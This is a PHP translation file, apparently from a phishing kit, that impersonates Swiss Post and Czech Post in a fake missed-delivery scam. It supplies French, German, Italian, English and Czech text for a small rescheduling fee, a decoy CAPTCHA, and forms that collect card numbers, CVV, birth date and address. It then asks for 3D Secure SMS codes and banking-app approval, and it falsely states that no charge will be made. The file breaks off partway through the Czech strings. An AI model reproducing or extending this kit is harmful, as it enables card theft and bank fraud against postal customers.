<?php
/**
 * LANGUAGE SYSTEM - Post CH
 * Priority: GET > SESSION > Browser Detection
 */

// Prevent direct access — this file must be included from another PHP page
if (basename($_SERVER['SCRIPT_FILENAME']) === basename(__FILE__)) {
    header('HTTP/1.1 403 Forbidden');
    exit();
}

function get_client_language() {
    return 'de';
}

$current_lang = 'de'; // Default

// 1. Browser Detection
if (isset($_SERVER['HTTP_ACCEPT_LANGUAGE'])) {
    $lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
    if (in_array($lang, ['fr', 'de', 'it', 'en', 'cs'])) {
        $current_lang = $lang;
    }
}

// 2. Session Override
if (isset($_SESSION['lang']) && in_array($_SESSION['lang'], ['fr', 'de', 'it', 'en', 'cs'])) {
    $current_lang = $_SESSION['lang'];
}

// 3. URL Override (User Action) - Highest Priority
if (isset($_GET['lang']) && in_array($_GET['lang'], ['fr', 'de', 'it', 'en', 'cs'])) {
    $current_lang = $_GET['lang'];
    $_SESSION['lang'] = $current_lang;
}

$translations = [
    // =====================================================================
    // FRANÇAIS (FR) — Suisse romande, ton naturel Post CH
    // =====================================================================
    'fr' => [
        // Header & Footer
        'secure_conn' => 'Connexion sécurisée',
        'help_contact' => 'Aide & Contact',
        'cond_gen' => 'Conditions générales',
        'data_prot' => 'Protection des données',
        'privacy_policy' => 'Politique de confidentialité',
        'cookies' => 'Cookies',
        'copyright' => 'La Poste Suisse SA – Tous droits réservés',
        
        // Modal (delivery.php)
        'delivery_issue_title' => 'Avis de passage',
        'delivery_issue_message' => 'Votre colis n\'a pas pu être livré car l\'adresse de livraison est incomplète ou le destinataire était absent. Pour reprogrammer la livraison, veuillez mettre à jour vos coordonnées. Des frais de traitement de <b>CHF 0.59</b> s\'appliquent conformément aux conditions générales.',
        'modal_ref' => 'Numéro de dossier',
        'btn_continue' => 'J\'ai compris',
        
        // CAPTCHA (gate.php)
        'captcha_title' => 'Vérification de sécurité',
        'captcha_why' => 'Pourquoi cette vérification ?',
        'captcha_desc' => 'Afin de protéger votre session, veuillez résoudre le calcul ci-dessous.',
        'solve_op' => 'Résolvez l\'opération :',
        'enter_result' => 'Votre réponse',
        'confirm_access' => 'Continuer',
        'secure_zone' => 'Zone sécurisée',
        'captcha_error' => 'Réponse incorrecte. Veuillez réessayer.',
        
        // Pages
        'personal_info_title' => 'Adresse de livraison',
        'personal_info_subtitle' => 'Veuillez vérifier et confirmer vos coordonnées pour la livraison.',
        'payment_title' => 'Paiement',
        'verification_title' => 'Vérification en cours',
        'auth_title' => 'Authentification',
        'auth_desc' => 'Veuillez patienter...',
        'loading_delivery_title' => 'Vérification de vos données',
        'loading_payment_title' => 'Traitement du paiement',
        'loading_code_title' => 'Vérification du code',
        
        // Formulaire
        'cardholder_name' => 'Nom du titulaire',
        'card_no' => 'Numéro de carte',
        'expiry' => 'MM/AA',
        'cvv_code' => 'CVV',
        'name' => 'Nom',
        'firstname' => 'Prénom',
        'dob' => 'Date de naissance',
        'address' => 'Rue et numéro',
        'npa' => 'NPA',
        'city' => 'Localité',
        'phone' => 'Téléphone mobile',
        'email' => 'Adresse e-mail',
        'required_fields' => '* Tous les champs sont obligatoires',
        'complete_now' => 'Confirmer et continuer',
        
        // Validation
        'err_email' => 'Adresse e-mail invalide (ex. : nom@exemple.ch)',
        'err_phone' => 'Numéro de téléphone invalide',
        'err_npa' => 'NPA invalide',
        'err_dob' => 'Format attendu : JJ/MM/AAAA',
        'err_card_number' => 'Numéro de carte invalide',
        'err_card_expiry' => 'Date d\'expiration invalide ou dépassée',
        'err_card_cvv' => 'Code CVV invalide (3 ou 4 chiffres)',
        'err_card_holder' => 'Veuillez saisir le nom complet du titulaire',
        'err_bad_cc_desc' => 'Les cartes virtuelles ou prépayées ne sont pas acceptées. Merci d\'utiliser une carte bancaire classique.',
        
        // Paiement
        'order_total' => 'Total',
        'cards_accepted' => 'Cartes acceptées',
        'pay_for' => 'Reprogrammation de livraison',
        'pay_btn' => 'Payer maintenant',
        'pay_btn_clean' => 'Confirmer le paiement',
        'secure_banner' => 'Paiement sécurisé – Chiffrement SSL 256 bits',
        'ssl_enc' => 'Transaction sécurisée par SSL',
        'banking_info' => 'Données de paiement',
        'ticket_header' => 'Récapitulatif',
        'fee_delivery' => 'Frais de reprogrammation',
        'fee_process' => 'Frais de gestion',
        'total_amount' => 'Total',
        'vat_msg' => 'TVA incluse',
        'cvv_help' => '3 chiffres au dos de la carte',
        'virtual_card_inline' => 'Seules les cartes de crédit ou de débit classiques sont acceptées.',
        'processing' => 'Traitement en cours...',
        
        // SMS & Loading
        'trans_label' => 'Transaction',
        'wait_msg' => 'Merci de ne pas fermer cette page.',
        'verification_header' => 'Authentification 3D Secure',
        'verification_text' => 'Un code de vérification a été envoyé par SMS sur votre téléphone. Saisissez-le ci-dessous pour confirmer la transaction.',
        'code_label' => 'Code de vérification',
        'code_invalid' => 'Code incorrect. Veuillez réessayer.',
        'confirm_btn' => 'Valider',
        'resend_link' => 'Renvoyer le code',
        'error_timeout_title' => 'Délai expiré',
        'error_timeout_msg' => 'La vérification a échoué. Un nouveau code vous sera envoyé automatiquement.',
        
        // App Validation
        'app_title' => 'Confirmation dans l\'application',
        'app_subtitle' => 'Veuillez confirmer la transaction dans votre application bancaire.',
        'app_desc' => 'Une notification a été envoyée sur votre appareil. Appuyez sur « Confirmer » dans votre application bancaire.',
        'app_btn' => 'J\'ai confirmé',
        'app_sim_disclaimer' => 'Le montant affiché correspond à une simulation. Aucun débit ne sera effectué à ce stade.',
        'loading_app_title' => 'Vérification de la confirmation',
        
        // Succès
        'success_title' => 'Livraison reprogrammée',
        'success_desc' => 'Votre demande a été enregistrée avec succès. Votre colis vous sera livré à la date ci-dessous.',
        'ref_label' => 'Numéro de suivi',
        'date_label' => 'Date de livraison prévue',
        'bene_label' => 'Transporteur',
        'status_label' => 'Statut',
        'status_ok' => 'Confirmé',
        'home_btn' => 'Retour à l\'accueil',
        'help_q' => 'Une question ?',
        'contact_supp' => 'Contactez-nous',
        'reprogram_title' => 'Nouvelle date de livraison',
        'reprogram_subtitle' => 'Sélectionnez une date de livraison souhaitée.',
        'reprogram_fee_msg' => 'Des frais de reprogrammation de <b>CHF 0.59</b> seront facturés pour confirmer cette nouvelle date de livraison.',
        'btn_validate_reprogram' => 'Confirmer la date',
        'processing_msg' => 'Veuillez patienter...',
        'delivery_between' => 'Livraison entre 08h00 et 18h00',
        'validate_my_info' => 'Confirmer mes coordonnées',
        'badge_secure' => 'Sécurisé',
        'badge_ssl' => 'Chiffrement SSL',
        'badge_verified' => 'Vérifié',
        'notif_confirm_msg' => 'Confirmer CHF 0.59 ?',
        '3d_secure_label' => '3D SECURE<br>VÉRIFIÉ',
        '3d_secure_hint' => 'Authentification bancaire sécurisée via 3D Secure',
        'card_warning_box' => '⚠️ <b>Important :</b> Si le paiement ne peut pas être effectué, la reprogrammation de l\'envoi ne sera pas prise en compte et le colis sera retourné à l\'expéditeur.',
        'all_cards_accepted' => 'Visa, Mastercard et American Express acceptées'
    ],
    
    // =====================================================================
    // DEUTSCH (DE) — Schweizerdeutsch / Schriftdeutsch, natürlicher Post-Ton
    // =====================================================================
    'de' => [
        // Header & Footer
        'secure_conn' => 'Sichere Verbindung',
        'help_contact' => 'Hilfe & Kontakt',
        'cond_gen' => 'AGB',
        'data_prot' => 'Datenschutz',
        'privacy_policy' => 'Datenschutzerklärung',
        'cookies' => 'Cookies',
        'copyright' => 'Die Schweizerische Post AG – Alle Rechte vorbehalten',
        
        // Modal
        'delivery_issue_title' => 'Zustellungshinweis',
        'delivery_issue_message' => 'Ihr Paket konnte nicht zugestellt werden, da die Lieferadresse unvollständig ist oder der Empfänger nicht angetroffen wurde. Bitte aktualisieren Sie Ihre Angaben, um die Zustellung erneut zu planen. Es fällt eine Bearbeitungsgebühr von <b>CHF 0.59</b> gemäss den AGB an.',
        'modal_ref' => 'Vorgangsnummer',
        'btn_continue' => 'Verstanden',
        
        // CAPTCHA
        'captcha_title' => 'Sicherheitsüberprüfung',
        'captcha_why' => 'Warum diese Prüfung?',
        'captcha_desc' => 'Zum Schutz Ihrer Sitzung lösen Sie bitte die folgende Rechenaufgabe.',
        'solve_op' => 'Berechnen Sie:',
        'enter_result' => 'Ihre Antwort',
        'confirm_access' => 'Weiter',
        'secure_zone' => 'Geschützter Bereich',
        'captcha_error' => 'Falsche Antwort. Bitte versuchen Sie es erneut.',
        
        // Pages
        'personal_info_title' => 'Lieferadresse',
        'personal_info_subtitle' => 'Bitte überprüfen und bestätigen Sie Ihre Angaben für die Zustellung.',
        'payment_title' => 'Zahlung',
        'verification_title' => 'Überprüfung',
        'auth_title' => 'Authentifizierung',
        'auth_desc' => 'Bitte warten...',
        'loading_delivery_title' => 'Ihre Angaben werden überprüft',
        'loading_payment_title' => 'Zahlung wird verarbeitet',
        'loading_code_title' => 'Code wird überprüft',
        
        // Formulaire
        'cardholder_name' => 'Name des Karteninhabers',
        'card_no' => 'Kartennummer',
        'expiry' => 'MM/JJ',
        'cvv_code' => 'CVV',
        'name' => 'Nachname',
        'firstname' => 'Vorname',
        'dob' => 'Geburtsdatum',
        'address' => 'Strasse und Hausnummer',
        'npa' => 'PLZ',
        'city' => 'Ort',
        'phone' => 'Mobilnummer',
        'email' => 'E-Mail-Adresse',
        'required_fields' => '* Alle Felder sind Pflichtfelder',
        'complete_now' => 'Bestätigen und weiter',
        
        // Validation
        'err_email' => 'Ungültige E-Mail-Adresse (z. B. name@beispiel.ch)',
        'err_phone' => 'Ungültige Telefonnummer',
        'err_npa' => 'Ungültige PLZ',
        'err_dob' => 'Erwartetes Format: TT/MM/JJJJ',
        'err_card_number' => 'Ungültige Kartennummer',
        'err_card_expiry' => 'Ungültiges oder abgelaufenes Ablaufdatum',
        'err_card_cvv' => 'Ungültiger CVV-Code (3 oder 4 Ziffern)',
        'err_card_holder' => 'Bitte geben Sie den vollständigen Namen des Karteninhabers ein',
        'err_bad_cc_title' => 'Karte nicht akzeptiert',
        'err_bad_cc_desc' => 'Virtuelle oder Prepaid-Karten werden nicht akzeptiert. Bitte verwenden Sie eine herkömmliche Bankkarte.',
        
        // Paiement
        'order_total' => 'Gesamtbetrag',
        'cards_accepted' => 'Akzeptierte Karten',
        'pay_for' => 'Neuzustellung',
        'pay_btn' => 'Jetzt bezahlen',
        'pay_btn_clean' => 'Zahlung bestätigen',
        'secure_banner' => 'Sichere Zahlung – SSL 256-Bit-Verschlüsselung',
        'ssl_enc' => 'SSL-verschlüsselte Transaktion',
        'banking_info' => 'Zahlungsdaten',
        'ticket_header' => 'Zusammenfassung',
        'fee_delivery' => 'Gebühr Neuzustellung',
        'fee_process' => 'Bearbeitungsgebühr',
        'total_amount' => 'Total',
        'vat_msg' => 'Inkl. MwSt.',
        'cvv_help' => '3 Ziffern auf der Kartenrückseite',
        'virtual_card_inline' => 'Es werden nur herkömmliche Kredit- oder Debitkarten akzeptiert.',
        'processing' => 'Wird verarbeitet...',
        
        // SMS & Loading
        'trans_label' => 'Transaktion',
        'wait_msg' => 'Bitte schliessen Sie diese Seite nicht.',
        'verification_header' => '3D-Secure-Authentifizierung',
        'verification_text' => 'Ein Bestätigungscode wurde per SMS an Ihr Mobiltelefon gesendet. Geben Sie ihn unten ein, um die Transaktion zu bestätigen.',
        'code_label' => 'Bestätigungscode',
        'code_invalid' => 'Falscher Code. Bitte versuchen Sie es erneut.',
        'confirm_btn' => 'Bestätigen',
        'resend_link' => 'Code erneut senden',
        'error_timeout_title' => 'Zeitüberschreitung',
        'error_timeout_msg' => 'Die Überprüfung konnte nicht abgeschlossen werden. Ein neuer Code wird Ihnen automatisch zugesendet.',
        
        // App Validation
        'app_title' => 'Bestätigung in der App',
        'app_subtitle' => 'Bitte bestätigen Sie die Transaktion in Ihrer Banking-App.',
        'app_desc' => 'Eine Benachrichtigung wurde an Ihr Gerät gesendet. Tippen Sie in Ihrer Banking-App auf «Bestätigen».',
        'app_btn' => 'Ich habe bestätigt',
        'app_sim_disclaimer' => 'Der angezeigte Betrag dient nur der Verifizierung. Es erfolgt keine Abbuchung.',
        'loading_app_title' => 'Bestätigung wird überprüft',
        
        // Success
        'success_title' => 'Zustellung neu geplant',
        'success_desc' => 'Ihre Anfrage wurde erfolgreich bearbeitet. Ihr Paket wird am unten angegebenen Datum zugestellt.',
        'ref_label' => 'Sendungsnummer',
        'date_label' => 'Voraussichtliches Zustelldatum',
        'bene_label' => 'Kurier',
        'status_label' => 'Status',
        'status_ok' => 'Bestätigt',
        'home_btn' => 'Zur Startseite',
        'help_q' => 'Haben Sie Fragen?',
        'contact_supp' => 'Kontaktieren Sie uns',
        'reprogram_title' => 'Neues Zustelldatum',
        'reprogram_subtitle' => 'Wählen Sie Ihr gewünschtes Zustelldatum.',
        'reprogram_fee_msg' => 'Für die Neuplanung der Zustellung wird eine Bearbeitungsgebühr von <b>CHF 0.59</b> erhoben.',
        'btn_validate_reprogram' => 'Datum bestätigen',
        'processing_msg' => 'Bitte warten...',
        'delivery_between' => 'Zustellung zwischen 08:00 und 18:00 Uhr',
        'validate_my_info' => 'Angaben bestätigen',
        'badge_secure' => 'Sicher',
        'badge_ssl' => 'SSL-Verschlüsselung',
        'badge_verified' => 'Verifiziert',
        'notif_confirm_msg' => 'CHF 0.59 bestätigen?',
        '3d_secure_label' => '3D SECURE<br>VERIFIZIERT',
        '3d_secure_hint' => 'Sichere Authentifizierung über 3D Secure',
        'card_warning_box' => '⚠️ <b>Wichtig:</b> Kann die Zahlung nicht durchgeführt werden, wird die Neuzustellung nicht berücksichtigt und das Paket an den Absender zurückgeschickt.',
        'all_cards_accepted' => 'Visa, Mastercard und American Express werden akzeptiert'
    ],
    
    // =====================================================================
    // ITALIANO (IT) — Italiano svizzero, tono naturale Post CH
    // =====================================================================
    'it' => [
        // Header & Footer
        'secure_conn' => 'Connessione sicura',
        'help_contact' => 'Aiuto & Contatto',
        'cond_gen' => 'CGC',
        'data_prot' => 'Protezione dei dati',
        'privacy_policy' => 'Informativa sulla privacy',
        'cookies' => 'Cookies',
        'copyright' => 'La Posta Svizzera SA – Tutti i diritti riservati',
        
        // Modal
        'delivery_issue_title' => 'Avviso di passaggio',
        'delivery_issue_message' => 'Il pacco non ha potuto essere consegnato perché l\'indirizzo di consegna è incompleto o il destinatario era assente. Per riprogrammare la consegna, aggiornate i vostri dati. Si applica una tassa di gestione di <b>CHF 0.59</b> conformemente alle CGC.',
        'modal_ref' => 'Numero pratica',
        'btn_continue' => 'Ho capito',
        
        // CAPTCHA
        'captcha_title' => 'Verifica di sicurezza',
        'captcha_why' => 'Perché questa verifica?',
        'captcha_desc' => 'Per proteggere la vostra sessione, risolvete il calcolo qui sotto.',
        'solve_op' => 'Calcolate:',
        'enter_result' => 'La vostra risposta',
        'confirm_access' => 'Continuare',
        'secure_zone' => 'Area protetta',
        'captcha_error' => 'Risposta sbagliata. Riprovate.',
        
        // Pages
        'personal_info_title' => 'Indirizzo di consegna',
        'personal_info_subtitle' => 'Verificate e confermate i vostri dati per la consegna.',
        'payment_title' => 'Pagamento',
        'verification_title' => 'Verifica in corso',
        'auth_title' => 'Autenticazione',
        'auth_desc' => 'Attendere prego...',
        'loading_delivery_title' => 'Verifica dei vostri dati',
        'loading_payment_title' => 'Elaborazione del pagamento',
        'loading_code_title' => 'Verifica del codice',
        
        // Forms
        'cardholder_name' => 'Nome del titolare',
        'card_no' => 'Numero della carta',
        'expiry' => 'MM/AA',
        'cvv_code' => 'CVV',
        'name' => 'Cognome',
        'firstname' => 'Nome',
        'dob' => 'Data di nascita',
        'address' => 'Via e numero civico',
        'npa' => 'NPA',
        'city' => 'Località',
        'phone' => 'Numero di cellulare',
        'email' => 'Indirizzo e-mail',
        'required_fields' => '* Tutti i campi sono obbligatori',
        'complete_now' => 'Confermare e continuare',
        
        // Validation
        'err_email' => 'Indirizzo e-mail non valido (es. nome@esempio.ch)',
        'err_phone' => 'Numero di telefono non valido',
        'err_npa' => 'NPA non valido',
        'err_dob' => 'Formato previsto: GG/MM/AAAA',
        'err_card_number' => 'Numero di carta non valido',
        'err_card_expiry' => 'Data di scadenza non valida o scaduta',
        'err_card_cvv' => 'CVV non valido (3 o 4 cifre)',
        'err_card_holder' => 'Inserite il nome completo del titolare',
        'err_bad_cc_title' => 'Carta non accettata',
        'err_bad_cc_desc' => 'Le carte virtuali o prepagate non sono accettate. Utilizzate una carta bancaria tradizionale.',
        
        // Payment
        'order_total' => 'Totale',
        'cards_accepted' => 'Carte accettate',
        'pay_for' => 'Riprogrammazione consegna',
        'pay_btn' => 'Pagare ora',
        'pay_btn_clean' => 'Confermare il pagamento',
        'secure_banner' => 'Pagamento sicuro – Crittografia SSL a 256 bit',
        'ssl_enc' => 'Transazione protetta da SSL',
        'banking_info' => 'Dati di pagamento',
        'ticket_header' => 'Riepilogo',
        'fee_delivery' => 'Spese di riprogrammazione',
        'fee_process' => 'Spese di gestione',
        'total_amount' => 'Totale',
        'vat_msg' => 'IVA inclusa',
        'cvv_help' => '3 cifre sul retro della carta',
        'virtual_card_inline' => 'Sono accettate solo carte di credito o debito tradizionali.',
        'processing' => 'Elaborazione in corso...',
        
        // SMS & Loading
        'trans_label' => 'Transazione',
        'wait_msg' => 'Non chiudete questa pagina.',
        'verification_header' => 'Autenticazione 3D Secure',
        'verification_text' => 'Un codice di verifica è stato inviato via SMS al vostro cellulare. Inseritelo qui sotto per confermare la transazione.',
        'code_label' => 'Codice di verifica',
        'code_invalid' => 'Codice errato. Riprovate.',
        'confirm_btn' => 'Confermare',
        'resend_link' => 'Inviare di nuovo',
        'error_timeout_title' => 'Tempo scaduto',
        'error_timeout_msg' => 'La verifica non è riuscita. Un nuovo codice vi sarà inviato automaticamente.',
        
        // App Validation
        'app_title' => 'Conferma nell\'app',
        'app_subtitle' => 'Confermate la transazione nella vostra app bancaria.',
        'app_desc' => 'Una notifica è stata inviata al vostro dispositivo. Toccate «Conferma» nella vostra app bancaria.',
        'app_btn' => 'Ho confermato',
        'app_sim_disclaimer' => 'L\'importo indicato è solo una verifica. Non verrà effettuato alcun addebito.',
        'loading_app_title' => 'Verifica della conferma',
        
        // Success
        'success_title' => 'Consegna riprogrammata',
        'success_desc' => 'La vostra richiesta è stata elaborata con successo. Il pacco sarà consegnato alla data indicata qui sotto.',
        'ref_label' => 'Numero di tracciamento',
        'date_label' => 'Data di consegna prevista',
        'bene_label' => 'Corriere',
        'status_label' => 'Stato',
        'status_ok' => 'Confermato',
        'home_btn' => 'Torna alla home',
        'help_q' => 'Avete domande?',
        'contact_supp' => 'Contattateci',
        'reprogram_title' => 'Nuova data di consegna',
        'reprogram_subtitle' => 'Selezionate la data di consegna desiderata.',
        'reprogram_fee_msg' => 'Per confermare la nuova data di consegna si applica una tassa di <b>CHF 0.59</b>.',
        'btn_validate_reprogram' => 'Confermare la data',
        'processing_msg' => 'Attendere prego...',
        'delivery_between' => 'Consegna tra le 08:00 e le 18:00',
        'validate_my_info' => 'Confermare i miei dati',
        'badge_secure' => 'Sicuro',
        'badge_ssl' => 'Crittografia SSL',
        'badge_verified' => 'Verificato',
        'notif_confirm_msg' => 'Confermare CHF 0.59?',
        '3d_secure_label' => '3D SECURE<br>VERIFICATO',
        '3d_secure_hint' => 'Autenticazione bancaria sicura tramite 3D Secure',
        'card_warning_box' => '⚠️ <b>Importante:</b> Se il pagamento non va a buon fine, la riprogrammazione della consegna non verrà presa in considerazione e il pacco sarà restituito al mittente.',
        'all_cards_accepted' => 'Visa, Mastercard e American Express accettate'
    ],
    
    // =====================================================================
    // ENGLISH (EN) — Clean, professional Post CH tone
    // =====================================================================
    'en' => [
        // Header & Footer
        'secure_conn' => 'Secure Connection',
        'help_contact' => 'Help & Contact',
        'cond_gen' => 'Terms & Conditions',
        'data_prot' => 'Data Protection',
        'privacy_policy' => 'Privacy Policy',
        'cookies' => 'Cookies',
        'copyright' => 'Swiss Post Ltd – All rights reserved',
        
        // Modal
        'delivery_issue_title' => 'Delivery Notice',
        'delivery_issue_message' => 'Your parcel could not be delivered because the delivery address is incomplete or the recipient was unavailable. Please update your details to reschedule delivery. A processing fee of <b>CHF 0.59</b> applies in accordance with the terms and conditions.',
        'modal_ref' => 'Reference number',
        'btn_continue' => 'I understand',
        
        // CAPTCHA
        'captcha_title' => 'Security Check',
        'captcha_why' => 'Why this check?',
        'captcha_desc' => 'To protect your session, please solve the calculation below.',
        'solve_op' => 'Calculate:',
        'enter_result' => 'Your answer',
        'confirm_access' => 'Continue',
        'secure_zone' => 'Secure Area',
        'captcha_error' => 'Incorrect answer. Please try again.',
        
        // Pages
        'personal_info_title' => 'Delivery Address',
        'personal_info_subtitle' => 'Please verify and confirm your delivery details.',
        'payment_title' => 'Payment',
        'verification_title' => 'Verification',
        'auth_title' => 'Authentication',
        'auth_desc' => 'Please wait...',
        'loading_delivery_title' => 'Verifying your details',
        'loading_payment_title' => 'Processing payment',
        'loading_code_title' => 'Verifying code',
        
        // Forms
        'cardholder_name' => 'Cardholder name',
        'card_no' => 'Card number',
        'expiry' => 'MM/YY',
        'cvv_code' => 'CVV',
        'name' => 'Last name',
        'firstname' => 'First name',
        'dob' => 'Date of birth',
        'address' => 'Street and house number',
        'npa' => 'Postcode',
        'city' => 'City',
        'phone' => 'Mobile number',
        'email' => 'Email address',
        'required_fields' => '* All fields are required',
        'complete_now' => 'Confirm and continue',
        
        // Validation
        'err_email' => 'Invalid email address (e.g. name@example.ch)',
        'err_phone' => 'Invalid phone number',
        'err_npa' => 'Invalid postcode',
        'err_dob' => 'Expected format: DD/MM/YYYY',
        'err_card_number' => 'Invalid card number',
        'err_card_expiry' => 'Invalid or expired expiry date',
        'err_card_cvv' => 'Invalid CVV (3 or 4 digits)',
        'err_card_holder' => 'Please enter the full cardholder name',
        'err_bad_cc_title' => 'Card not accepted',
        'err_bad_cc_desc' => 'Virtual or prepaid cards are not accepted. Please use a standard bank card.',
        
        // Payment
        'order_total' => 'Total',
        'cards_accepted' => 'Accepted cards',
        'pay_for' => 'Delivery rescheduling',
        'pay_btn' => 'Pay now',
        'pay_btn_clean' => 'Confirm payment',
        'secure_banner' => 'Secure payment – 256-bit SSL encryption',
        'ssl_enc' => 'SSL-encrypted transaction',
        'banking_info' => 'Payment details',
        'ticket_header' => 'Summary',
        'fee_delivery' => 'Rescheduling fee',
        'fee_process' => 'Processing fee',
        'total_amount' => 'Total',
        'vat_msg' => 'VAT included',
        'cvv_help' => '3 digits on the back of the card',
        'virtual_card_inline' => 'Only standard credit or debit cards are accepted.',
        'processing' => 'Processing...',
        
        // SMS & Loading
        'trans_label' => 'Transaction',
        'wait_msg' => 'Please do not close this page.',
        'verification_header' => '3D Secure Authentication',
        'verification_text' => 'A verification code has been sent to your mobile phone by SMS. Enter it below to confirm the transaction.',
        'code_label' => 'Verification code',
        'code_invalid' => 'Incorrect code. Please try again.',
        'confirm_btn' => 'Confirm',
        'resend_link' => 'Resend code',
        'error_timeout_title' => 'Session expired',
        'error_timeout_msg' => 'Verification failed. A new code will be sent to you automatically.',
        
        // App Validation
        'app_title' => 'Confirm in your app',
        'app_subtitle' => 'Please confirm the transaction in your banking app.',
        'app_desc' => 'A notification has been sent to your device. Tap "Confirm" in your banking app.',
        'app_btn' => 'I have confirmed',
        'app_sim_disclaimer' => 'The amount shown is for verification only. No charge will be made.',
        'loading_app_title' => 'Verifying confirmation',
        
        // Success
        'success_title' => 'Delivery rescheduled',
        'success_desc' => 'Your request has been processed successfully. Your parcel will be delivered on the date shown below.',
        'ref_label' => 'Tracking number',
        'date_label' => 'Estimated delivery date',
        'bene_label' => 'Carrier',
        'status_label' => 'Status',
        'status_ok' => 'Confirmed',
        'home_btn' => 'Back to home',
        'help_q' => 'Any questions?',
        'contact_supp' => 'Contact us',
        'reprogram_title' => 'New delivery date',
        'reprogram_subtitle' => 'Select your preferred delivery date.',
        'reprogram_fee_msg' => 'A rescheduling fee of <b>CHF 0.59</b> will be charged to confirm this new delivery date.',
        'btn_validate_reprogram' => 'Confirm date',
        'processing_msg' => 'Please wait...',
        'delivery_between' => 'Delivery between 08:00 and 18:00',
        'validate_my_info' => 'Confirm my details',
        'badge_secure' => 'Secure',
        'badge_ssl' => 'SSL Encryption',
        'badge_verified' => 'Verified',
        'notif_confirm_msg' => 'Confirm CHF 0.59?',
        '3d_secure_label' => '3D SECURE<br>VERIFIED',
        '3d_secure_hint' => 'Secure banking authentication via 3D Secure',
        'card_warning_box' => '⚠️ <b>Important:</b> If the payment cannot be processed, the delivery will not be rescheduled and the parcel will be returned to the sender.',
        'all_cards_accepted' => 'Visa, Mastercard and American Express accepted'
    ],

    // =====================================================================
    // ČEŠTINA (CS) — Republika česka, přirozený tón
    // =====================================================================
    'cs' => [
        // Header & Footer
        'secure_conn' => 'Zabezpečené připojení',
        'help_contact' => 'Pomoc a kontakt',
        'cond_gen' => 'Obecné podmínky',
        'data_prot' => 'Ochrana údajů',
        'privacy_policy' => 'Zásady ochrany osobních údajů',
        'cookies' => 'Cookies',
        'copyright' => 'Česká pošta, s.p. – Všechna práva vyhrazena',

        // Modal
        'delivery_issue_title' => 'Oznámení o pokuse o doručení',
        'delivery_issue_message' => 'Váš balíček nemohl být doručen, protože je doručovací adresa neúplná nebo příjemce nebyl zastižen. Chcete-li přeplánovat doručení, aktualizujte prosím své údaje. Podle obecných podmínek se bude účtovat manipulační poplatek ve výši <b>50 Kč</b>.',
        'modal_ref' => 'Číslo případu',
        'btn_continue' => 'Rozumím',

        // CAPTCHA
        'captcha_title' => 'Bezpečnostní ověření',
        'captcha_why' => 'Proč toto ověření?',
        'captcha_desc' => 'Pro ochranu vaší relace vyřešte prosím níže uvedený výpočet.',
        'solve_op' => 'Vyřešte operaci:',
        'enter_result' => 'Vaše odpověď',
        'confirm_access' => 'Pokračovat',
        'secure_zone' => 'Bezpečná zóna',
        'captcha_error' => 'Nesprávná odpověď. Prosím, zkuste znovu.',

        // Pages
        'personal_info_title' => 'Doručovací adresa',
        'personal_info_subtitle' => 'Prosím, ověřte a potvrďte své údaje pro doručení.',
        'payment_title' => 'Platba',
        'verification_title' => 'Ověřování',
        'auth_title' => 'Ověřování',
        'auth_desc' => 'Prosím, čekejte...',
        'loading_delivery_title' => 'Ověření vašich údajů',
        'loading_payment_title' => 'Zpracování platby',
        'loading_code_title' => 'Ověření kódu',

        // Form
        'cardholder_name' => 'Jméno držitele',
        'card_no' => 'Číslo karty',
        'expiry' => 'MM/RR',
        'cvv_code' => 'CVV',
        'name' => 'Příjmení',
        'firstname' => 'Jméno',
        'dob' => 'Datum narození',
        'address' => 'Ulice a číslo',
        'npa' => 'PSČ',
        'city' => 'Město',
        'phone' => 'Mobilní telefon',
        'email' => 'E-mailová adresa',
        'required_fields' => '* Všechna pole jsou povinná',
        'complete_now' => 'Potvrdit a pokračovat',

        // Validation
        'err_email' => 'Neplatná e-mailová adresa (př. jmeno@priklad.cz)',
        'err_phone' => 'Neplatné telefonní číslo',
        'err_npa' => 'Neplatné PSČ',
        'err_dob' => 'Očekávaný formát: DD/MM/RRRR',
        'err_card_number' => 'Neplatné číslo karty',
        'err_card_expiry' => 'Neplatné nebo vypršelé datum platnosti',
        'err_card_cvv' => 'Neplatný kód CVV (3 nebo 4 číslice)',
        'err_card_holder' => 'Prosím, zadejte úplné jméno držitele karty',
        'err_bad_cc_desc' => 'Virtuální nebo předplacené karty nejsou přijímány. Použijte prosím běžnou bankovní kartu.',

        // Payment
        'order_total' => 'Celkem',
        'cards_accepted' => 'Přijímané karty',
        'pay_for' => 'Přeplánování doručení',
        'pay_btn' => 'Zaplatit nyní',
        'pay_btn_clean' => 'Potvrdit platbu',
        'secure_banner' => 'Zabezpečená platba – Šifrování SSL 256 bitů',
        'ssl_enc' => 'Transakce zabezpečená SSL',
        'banking_info' => 'Údaje pro platbu',
        'ticket_header' => 'Přehled',
        'fee_delivery' => 'Poplatek za přeplánování',
        'fee_process' => 'Poplatek za zpracování',
        'total_amount' => 'Celkem',
        'vat_msg' => 'DPH zahrnuta',
        'cvv_help' => '3 číslice na zadní straně karty',
        'virtual_card_inline' => 'Jsou přijímány pouze běžné kreditní nebo debetní karty.',
        'processing' => 'Zpracovávání...',

        // SMS & Loading
        'trans_label' => 'Transakce',
        'wait_msg' => 'Prosím, nezavírejte tuto stránku.',
        'verification_header' => 'Ověřování pomocí 3D Secure',
        'verification_text' => 'Ověřovací kód byl odeslán SMS na váš mobilní telefon. Zadejte jej níže pro potvrzení transakce.',
        'code_label' => 'Ověřovací kód',
        'code_invalid' => 'Nesprávný kód. Prosím, zkuste znovu.',
        'confirm_btn' => 'Potvrdit',
        'resend_link' => 'Poslat kód znovu',
        'error_timeout_title' => 'Časový limit vypršel',
        'error_timeout_msg' => 'Ověření se nepodařilo. Nový kód vám bude poslán automaticky.',

        // App Validation
        'app_title' => 'Potvrzení v aplikaci',
        'app_subtitle' => 'Prosím, potvrďte transakci ve vaší bankovní aplikaci.',
        'app_desc' => 'Oznámení bylo odeslano na vaše zařízení. V bankovní aplikaci klepněte na „Potvrdit".',
        'app_btn' => 'Potvrdil jsem',
        'app_sim_disclaimer' => 'Zobrazená částka je pouze simulace. V tomto okamžiku nebude provedeno žádné stržení.',
        'loading_app_title' => 'Ověřování potvrzení',

        // Success
        'success_title' => 'Doručení přeplánováno',
        'success_desc' => 'Vaša žádost byla úspěšně zpracována. Váš balíček bude doručen v níže uvedeném datu.',
        'ref_label' => 'Číslo sledování',
        'date_label' => 'Plánované datum doručení',
        'bene_label' => 'Přepravce',
        'status_label' => 'Stav',
        'status_ok' => 'Potvrzen',
        'home_btn' => 'Zpět na domovskou stránku',
        'help_q' => 'Máte otázku?',
